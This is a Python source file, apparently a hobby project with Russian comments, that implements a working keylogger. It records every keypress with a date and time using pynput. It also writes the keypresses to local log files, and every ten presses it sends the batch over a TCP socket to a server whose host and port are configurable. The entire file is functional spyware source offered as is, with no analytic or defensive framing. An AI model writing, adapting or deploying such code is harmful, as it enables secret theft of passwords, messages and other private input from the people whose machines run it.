import socket as sock
import logging
import datetime

from typing import List, Optional
from pynput.keyboard import Key, Listener


class Client:
    def __init__(self, host: str = sock.gethostname(), port: int = 12345) -> None: 
        self._host: str = host
        self._port: str = port

        self.client: sock.socket = sock.socket(sock.AF_INET, sock.SOCK_STREAM)

        # настройки логгера
        path_to_log: str = "D:\\Coding\\PYTHON\\big_projects\\keylogger\\keylogger\\client_logs.log"
        logging.basicConfig(level=logging.INFO, filename=path_to_log, filemode='w')

        try:
            self.client.connect((self._host, self._port))  # подключение к адресу серверного сокета
        except sock.error as err:
            self.client.close()  # закрытие сокета в случае ошибки
            logging.critical(f"Client connecting to server failed: {err}")
        else:
            logging.info("connected.")


    def __str__(self) -> str:
        return f"host: {self._host}; port: {self._port}"
    

    def send(self, data: str | List[str]) -> Optional[str]: 
        if type(data) == list:
            data = "".join(data)

        try:
            self.client.send(data.encode())  # отправка данных на сервер
        except sock.error as err:
            self.client.close()
            logging.critical(f"Sending data failed: {err}")

        
    def close(self) -> None:
        self.client.close()


class Keylogger: 
    def __init__(self, client: Client, keys_limit: int = 10) -> None: 
        self._client: Client = client
        self._MAX_LIMIT: int = keys_limit  # лимит нажатий перед отправкой

        # настройки логгера
        path_to_log: str = "D:\\Coding\\PYTHON\\big_projects\\keylogger\\keylogger\\keylogger_logs.log"
        logging.basicConfig(level=logging.INFO, filename=path_to_log, filemode='w')


    def run(self) -> None: 
        while 1:
            try:
                self.listen_keys()  # прослушивание нажатий
            except Exception as err:
                logging.critical(f"error: {err}")

        self._client.close()


    def listen_keys(self) -> list[str]:
        keys: List[str] = []  # список нажатий 

        count: int = 0  # кол-во нажатийы

        def on_press(key) -> None: 
            k: str = str(key).replace("'", "")
            cur_date: str = datetime.date.today().isoformat()  # текущая дата
            cur_time: str = datetime.datetime.now().time().isoformat()[:-7]  # текущее время

            mes: str = f'[{cur_date}] {cur_time} - key: \"{k}\"\n'  # лог о нажатии, идущий на сервер
            keys.append(mes)  
            logging.info(f'[+] [{cur_date}] {cur_time} - key: \"{k}\"')

            nonlocal count
            count += 1

            # если число нажатий равно максимальному лимиту
            if count == self._MAX_LIMIT:
                self._client.send(keys)  # отправка всего списка с логами на сервер 
                keys.clear()  # очистка списка
                count = 0  # обнуление кол-ва нажатий

        def on_release(key) -> None:
            if key == Key.esc:  # клавиша выхода
                return False

        # прослушивание нажатий
        try:
            with Listener(on_press=on_press, on_release=on_release) as listener:
                listener.join()
        except Exception as err:
            logging.critical(f'Keyboard listening failed: {err}')


def main() -> None: 
    keylogger: Keylogger = Keylogger(Client())
    keylogger.run()


if __name__ == '__main__':
    main()